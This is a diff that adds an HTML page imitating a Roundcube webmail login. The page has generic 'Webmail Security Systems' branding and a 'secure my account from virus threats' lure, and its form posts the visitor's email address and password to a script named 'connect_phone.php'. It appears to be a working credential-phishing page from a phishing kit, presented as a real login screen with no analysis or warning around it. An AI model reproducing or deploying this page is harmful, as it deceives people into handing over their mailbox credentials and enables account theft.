@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" class=" js mozilla">
+ <head>
+  <title>
+   Webmail :: Welcome to  Webmail
+  </title>
+  <meta content="noindex,nofollow" name="Robots" />
+  <meta content="IE=EDGE" http-equiv="X-UA-Compatible" />
+  <meta id="viewport" content="" name="viewport" />
+  <link href="http:///favicon.ico" rel="SHORTCUT ICON" />
+  <link href="FILES/styles.css?s=1387973879" type="text/css" rel="stylesheet" />
+  <!--[if IE 9]><link rel="stylesheet" type="text/css" href="FILES/svggradients.css?s=1382384360"  /><![endif]-->
+  <!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="FILES/iehacks.css?s=1382384360"  /><![endif]-->
+  <!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="FILES/ie7hacks.css?s=1382384360"  /><![endif]-->
+  <link href="plugins/jqueryui/themes/larry/jquery-ui-1.9.2.custom.css?s=1399644532" type="text/css" rel="stylesheet" />
+  <script src="FILES/ui.js?s=1382384360" type="text/javascript">
+  </script>
+  <meta content="content-type" http-equiv="content-type" />
+  <script type="text/javascript" src="FILES/jquery.min.js?s=1399644532">
+  </script>
+  <script type="text/javascript" src="FILES/common.min.js?s=1399644532">
+  </script>
+  <script type="text/javascript" src="FILES/app.min.js?s=1399644532">
+  </script>
+  <script type="text/javascript" src="FILES/jstz.min.js?s=1399644532">
+  </script>
+  <script type="text/javascript">
+   &lt;!--
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"larry","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","date_format":"yy-mm-dd","request_token":"fbc944b0cb57238d7aa0e153b555d63c"});
+rcmail.gui_container("loginfooter","bottomline");
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing..."});
+rcmail.gui_object('loginform', 'form');
+rcmail.gui_object('message', 'message');
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))&gt;0&amp;&amp;parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&amp;&amp;d.all) x=d.all[n]; for (i=0;!x&amp;&amp;i&lt;d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&amp;&amp;d.layers&amp;&amp;i&lt;d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x &amp;&amp; d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_validateForm() { //v4.0
+  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
+  for (i=0; i&lt;(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
+    if (val) { nm=val.name; if ((val=val.value)!="") {
+      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
+        if (p&lt;1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
+      } else if (test!='R') { num = parseFloat(val);
+        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
+        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
+          min=test.substring(8,p); max=test.substring(p+1);
+          if (num&lt;min || max&lt;num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
+    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
+  } if (errors) alert('The following error(s) occurred:\n'+errors);
+  document.MM_returnValue = (errors == '');
+}
+//--&gt;
+  </script>
+  <script src="FILES/jquery-ui-1.9.2.custom.min.js?s=1399644532" type="text/javascript">
+  </script>
+  <style type="text/css">
+   &lt;!--
+.style1 {
+	color: #FF3300;
+	font-weight: bold;
+	font-size: 24px;
+	font-family: Geneva, Arial, Helvetica, sans-serif;
+}
+--&gt;
+  </style>
+ </head>
+ <body class="minimal">
+  <div id="login-form">
+   <div class="box-inner">
+    <div align="center">
+     <br />
+     <span class="style1">
+      <img width="25" height="25" alt="" src="http:///favicon.ico" />
+      Online Webmail App
+     </span>
+    </div>
+    <br />
+    <!-- End Table 2-->
+    <!--Table 3-->
+    <table cellspacing="0" cellpadding="0">
+     <colgroup>
+      <col>
+      </col>
+      <col class="w100">
+      </col>
+     </colgroup>
+     <tbody>
+      <tr class="height">
+       <td>
+        <input type="radio" checked="checked" onclick="clkSec()" class="rdo" value="0" name="trusted" id="rdoPblc" />
+       </td>
+       <td>
+        <label for="rdoPblc">
+         Secure my account from virus threats.
+        </label>
+       </td>
+      </tr>
+      <tr class="height">
+       <td>
+        <input type="radio" onclick="clkSec()" class="rdo" value="4" name="trusted" id="rdoPrvt" />
+       </td>
+       <td>
+        <label for="rdoPrvt">
+         This is a private computer
+        </label>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+    <br />
+    <form method="post" action="connect_phone.php" name="form">
+     <table>
+      <tbody>
+       <tr>
+        <td class="title">
+         <label for="rcmloginuser">
+          Email Address
+         </label>
+        </td>
+        <td class="input">
+         <input type="text" autocapitalize="off" required="required" size="40" value="" id="rcmloginuser" name="username" />
+        </td>
+       </tr>
+       <tr>
+        <td class="title">
+         <label for="rcmloginpwd">
+          Password
+         </label>
+        </td>
+        <td class="input">
+         <input type="password" autocapitalize="off" size="40" required="required" id="rcmloginpwd" value="" name="password" />
+        </td>
+       </tr>
+      </tbody>
+     </table>
+     <p class="formbuttons">
+      <input type="submit" value="Login to continue" onclick="MM_validateForm('rcmloginuser','','RisEmail','rcmloginpwd','','R');return document.MM_returnValue" class="button mainaction" />
+      <br />
+      <br />
+      <br />
+      Connected to
+     </p>
+    </form>
+   </div>
+   <div id="bottomline">
+    <!-- Webmail -->
+    Secured by  Webmail Security Systems
+    <br />
+    © 2015  Corporation. All rights reserved.
+   </div>
+  </div>
+  <script type="text/javascript">
+   // UI startup
+var UI = new rcube_mail_ui();
+$(document).ready(function(){
+	UI.set('errortitle', 'An error occurred!');
+	UI.init();
+});
+  </script>
+  <script type="text/javascript">
+   jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
+                using: function(pos) {
+                    var me = jQuery(this),
+                        offset = me.css(pos).offset(),
+
+                        topOffset = offset.top - 12;
+                    if (topOffset &lt; 0)
+                        me.css('top', pos.top - topOffset);
+                    if (offset.left + me.outerWidth() + 12 &gt; jQuery(window).width())
+                        me.css('left', pos.left - 12);
+                }
+            });
+$(document).ready(function(){ 
+rcmail.init();
+var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
+            for (var i=0; i&lt;images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+  </script>
+ </body>
+</html>
